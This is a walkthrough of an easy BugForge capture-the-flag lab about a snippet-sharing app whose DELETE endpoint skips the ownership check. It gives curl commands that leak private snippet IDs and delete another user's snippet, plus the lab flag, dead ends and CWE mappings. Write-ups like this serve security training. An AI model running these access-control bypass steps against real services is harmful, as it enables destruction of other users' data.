# copypasta-003 - BugForge Lab Walkthrough

**URL:** https://lab-1781213709825-5lf2p3.labs-app.bugforge.io/
**Difficulty:** Easy  
**Vulnerability:** Broken Access Control - Missing Ownership Check on DELETE /api/snippets/:id
**Flag:** `bug{t2Kz3DrSlVniU5npVyh8o3k29BMisHGt}`

---

## Summary

CopyPasta is a code snippet sharing platform. The `DELETE /api/snippets/:id` endpoint lacks server-side ownership verification - any authenticated user can delete any snippet by integer ID. Deleting the seeded private snippet (id=4) returns the flag in the JSON response body.

## Tech Stack

- React (CRA) frontend with React Router + MUI
- Node.js + Express backend
- JWT (HS256) auth stored in localStorage
- SQLite database
- Source maps exposed in production build

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `GET /api/profile/:username` | Required | Returns ALL snippets incl. private (CWE-602, secondary bug) |
| `DELETE /api/snippets/:id` | Required | **No ownership check - deletes any snippet by ID** |
| `PUT /api/snippets/:id` | Required | Ownership check enforced ("Not authorized to edit this snippet") |
| `GET /api/snippets/public` | Required | Public snippets only |
| `GET /api/snippets/:id/comments` | Required | Works with integer IDs |

## Attack Chain

**Step 1: Register an account**
```bash
curl -s -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@evil.com","password":"Password123!"}'
# Capture token from response
```

**Step 2: Read profile API to discover private snippet IDs**
```bash
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/profile/pythonista"
# Response includes private snippet: id=4, is_public=0, title="Password Generator"
```

**Step 3: Delete the private snippet by ID - flag returned in response**
```bash
curl -s -X DELETE -H "Authorization: Bearer $TOKEN" "$TARGET/api/snippets/4"
# {"message":"Snippet deleted successfully","flag":"bug{t2Kz3DrSlVniU5npVyh8o3k29BMisHGt}"}
```

## Discovery Notes

- Phase 2 source audit immediately flagged `snippets.filter(s => s.is_public)` in Profile.js - server returns all snippets including private ones via `GET /api/profile/:username`
- The private snippet (id=4) was identified as the target
- `PUT /api/snippets/:id` had a server-side ownership check ("Not authorized to edit this snippet") - assumed DELETE would too, but it didn't
- The DELETE response returned the flag, confirming the intended exploit path

## Dead Ends

| Attempt | Result | Lesson |
|---|---|---|
| Mass assignment `role:admin` on register | Stripped server-side | Role field not writable on register |
| Mass assignment `role:admin` on PUT /api/profile | Silently ignored, role stays "user" | Profile update allowlisted |
| `PUT /api/snippets/7` (admin's snippet) | "Not authorized to edit this snippet" | PUT has ownership check, DELETE does not |
| Admin endpoint enumeration (/api/admin, /api/flag, etc.) | SPA HTML fallback | Server has no admin routes |
| Reading private snippet code via profile | Got the code - just a password generator, no flag | Flag was on the DELETE action, not the read |
| JWT manipulation / alg:none | Not attempted - easier vector found | |

## Root Causes

- `DELETE /api/snippets/:id` does not verify that the requesting user owns the snippet - only checks that the user is authenticated
- `GET /api/profile/:username` returns private snippets to any authenticated user (CWE-602: client-side enforcement), which leaks the integer IDs needed for the DELETE exploit
- The flag being returned on DELETE is the detection mechanism - in a real app this would be a data destruction IDOR

## CWE / OWASP

- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-602: Client-Side Enforcement of Server-Side Security (secondary, on profile endpoint)
- OWASP A01:2021 - Broken Access Control
